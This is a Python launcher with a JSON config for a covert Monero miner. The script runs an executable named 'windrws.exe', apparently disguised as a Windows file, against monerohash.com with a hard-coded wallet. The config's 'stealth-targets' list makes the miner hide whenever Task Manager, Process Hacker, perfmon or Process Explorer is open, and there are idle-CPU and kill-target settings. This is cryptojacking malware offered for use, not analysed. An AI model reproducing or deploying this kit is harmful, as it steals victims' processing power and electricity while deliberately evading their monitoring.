import subprocess
import json

# Чтение JSON-строки из файла
with open('config.json', 'r') as f:
    config = json.load(f)

# Формирование команды для выполнения
command = f"windrws.exe -o {config['pool']}:{config['port']} -u {config['wallet']} -k --tls"

# Выполнение команды
subprocess.call(command, shell=True)

input("Press Enter to continue...")



{
    "algo": "rx/0",
    "pool": "monerohash.com",
    "port": 9999,
    "wallet": "48Q1ZrHfF6hPhsAndzs5YJ4hHbUeJEnD9Ta2XW3zfLYMDjtLpS5AWQpG168V9snAPGE51uke3Zj2M7Jdo8UJTbkwFafESFB",
    "password": "",
    "nicehash": false,
    "ssltls": true,
    "max-cpu": 40,
    "idle-wait": 5,
    "idle-cpu": 80,
    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
    "kill-targets": "",
    "stealth-fullscreen": false
}